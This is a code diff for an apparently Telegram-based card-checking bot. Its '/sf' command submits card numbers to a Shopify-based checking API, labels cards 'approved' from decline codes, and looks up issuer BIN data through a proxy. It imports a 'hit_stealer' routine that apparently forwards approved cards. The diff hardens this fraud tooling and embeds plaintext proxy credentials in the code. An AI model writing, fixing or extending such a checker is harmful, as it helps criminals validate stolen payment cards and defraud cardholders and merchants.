@@ -6,7 +6,7 @@ from httpx import AsyncHTTPTransport
 from plugins.func.users_sql import fetchinfo, updatedata, plan_expirychk
 from plugins.tools.hit_stealer import send_hit_if_approved
 
-@Client.on_message(filters.command("sf", prefixes=["/", "."]), group=95)
+@Client.on_message(filters.command("sf", prefixes=["/", "."]), group=96)
 async def cmd_sf(client, message):
     try:
         user_id = str(message.from_user.id)
@@ -65,6 +65,12 @@ f"""<code>┏━━━━━━━⍟</code>
 
         tic = time.perf_counter()
 
+        card_status = "declined"
+        card_message = "Request failed"
+        brand = type_ = level = bank = country = "N/A"
+        flag = "🏳️"
+
+        # Shopify check
         try:
             async with httpx.AsyncClient(timeout=30) as http_client:
                 headers = {
@@ -83,36 +89,43 @@ f"""<code>┏━━━━━━━⍟</code>
                         "is_shippable": False
                     }
                 }
+
                 res = await http_client.post("https://api.voidapi.xyz/v2/shopify_graphql", json=payload, headers=headers)
-                data = res.json()
-                raw_msg = data.get("message") or data.get("error") or "No response"
+
+                try:
+                    data = res.json()
+                    raw_msg = data.get("message") or data.get("error") or "No response"
+                except:
+                    raw_msg = res.text or "No response"
+
                 msg_check = raw_msg.lower()
                 card_status = "approved" if any(x in msg_check for x in ["processedreceipt", "zip", "avs", "incorrect_cvc", "insufficient", "charged"]) else "declined"
                 card_message = raw_msg
-
-            # BIN Info using proxy with AsyncHTTPTransport
-            try:
-                bin_proxy_url = "http://package-1111111-country-us:5671nuWwEPrHCw2t@proxy.rampageproxies.com:5000"
-                bin_transport = AsyncHTTPTransport(proxy=bin_proxy_url)
-
-                async with httpx.AsyncClient(transport=bin_transport, timeout=15) as bin_client:
-                    binres = await bin_client.get(f"https://api.voidex.dev/api/bin?bin={ccnum[:6]}")
-                    bininfo = binres.json()
-                    brand = str(bininfo.get("brand") or bininfo.get("scheme") or "N/A").upper()
-                    type_ = str(bininfo.get("type", "N/A")).upper()
-                    level = str(bininfo.get("level", "N/A")).upper()
-                    bank = str(bininfo.get("bank", "N/A")).upper()
-                    country = str(bininfo.get("country_name", "N/A")).upper()
-                    flag = bininfo.get("country_flag", "🏳️")
-            except Exception:
-                brand = type_ = level = bank = country = "N/A"
-                flag = "🏳️"
-
         except Exception as e:
-            card_status = "error"
             card_message = f"Request failed: {e}"
-            brand = type_ = level = bank = country = "N/A"
-            flag = "🏳️"
+
+        # BIN check (always runs, even if Shopify fails)
+        bin_proxies = [
+            "http://package-1111111-country-us:5671nuWwEPrHCw2t@proxy.rampageproxies.com:5000",
+            "http://package-1111111-country-us:5671nuWwEPrHCw2t@proxy.rampageproxies.com:5000",
+            "http://package-1111111-country-us:5671nuWwEPrHCw2t@proxy.rampageproxies.com:5000"
+        ]
+        for proxy in bin_proxies:
+            try:
+                bin_transport = AsyncHTTPTransport(proxy=proxy)
+                async with httpx.AsyncClient(transport=bin_transport, timeout=10) as bin_client:
+                    binres = await bin_client.get(f"https://api.voidex.dev/api/bin?bin={ccnum[:6]}")
+                    if binres.status_code == 200:
+                        bininfo = binres.json()
+                        brand = str(bininfo.get("brand") or bininfo.get("scheme") or "N/A").upper()
+                        type_ = str(bininfo.get("type", "N/A")).upper()
+                        level = str(bininfo.get("level", "N/A")).upper()
+                        bank = str(bininfo.get("bank", "N/A")).upper()
+                        country = str(bininfo.get("country_name", "N/A")).upper()
+                        flag = bininfo.get("country_flag", "🏳️")
+                        break
+            except:
+                continue
 
         toc = time.perf_counter()
         status = "Approved ✅" if card_status == "approved" else "Declined ❌"
